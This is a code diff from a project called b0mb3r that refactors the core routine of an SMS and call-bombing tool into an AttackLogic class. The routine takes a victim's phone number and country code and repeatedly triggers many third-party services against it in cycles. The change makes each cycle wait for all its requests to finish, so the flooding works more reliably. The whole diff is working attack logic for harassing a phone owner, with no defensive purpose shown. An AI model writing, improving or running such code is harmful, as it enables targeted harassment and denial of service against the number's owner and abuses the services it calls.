@@ -4,32 +4,51 @@ from datetime import datetime
 from loguru import logger
 
 from b0mb3r.app.status import status
-from b0mb3r.service import services
+from b0mb3r.service import prepare_services
 from b0mb3r.utils import await_with_callback
 
 
-@logger.catch
-async def perform_attack(attack_id: str, number_of_cycles: int, country_code: int, phone: str):
-    usable_services = services.get(country_code, services["other"])
+class AttackLogic:
+    def __init__(
+        self, attack_id: str, number_of_cycles: int, country_code: int, phone: str
+    ):
+        self.attack_id = attack_id
+        self.number_of_cycles = number_of_cycles
+        self.country_code = country_code
+        self.phone = phone
 
-    status[attack_id]["started_at"] = datetime.now().isoformat()
-    status[attack_id]["end_at"] = len(usable_services) * number_of_cycles
+    @logger.catch
+    async def perform_attack(self):
+        try:
+            await self._perform_attack()
+        except asyncio.CancelledError:
+            pass
 
-    logger.info(f"Starting attack {attack_id} on +{phone}...")
+    async def _perform_attack(self):
+        services = prepare_services()
+        usable_services = services.get(self.country_code, services["other"])
 
-    for cycle in range(number_of_cycles):
-        logger.info(f"Started cycle {cycle + 1} of attack {attack_id}")
-        for service in usable_services:
-            logger.debug(f"Running {service.__name__} in attack {attack_id}")
-            asyncio.create_task(
+        status[self.attack_id]["started_at"] = datetime.now().isoformat()
+        status[self.attack_id]["end_at"] = len(usable_services) * self.number_of_cycles
+
+        logger.info(f"Starting attack {self.attack_id} on +{self.phone}...")
+
+        for cycle in range(self.number_of_cycles):
+            logger.info(f"Started cycle {cycle + 1} of attack {self.attack_id}")
+
+            tasks = [
                 await_with_callback(
-                    service(phone, country_code).run(), update_count, attack_id=attack_id,
+                    service(self.phone, self.country_code).run(),
+                    update_count,
+                    attack_id=self.attack_id,
                 )
-            )
-        # TODO Make sure every task from previous cycle have completed before starting new one
-        await asyncio.sleep(3)
+                for service in usable_services
+            ]
 
-    logger.success(f"Attack {attack_id} on +{phone} ended")
+            for task in asyncio.as_completed(tasks):
+                await task
+
+        logger.success(f"Attack {self.attack_id} on +{self.phone} ended")
 
 
 @logger.catch
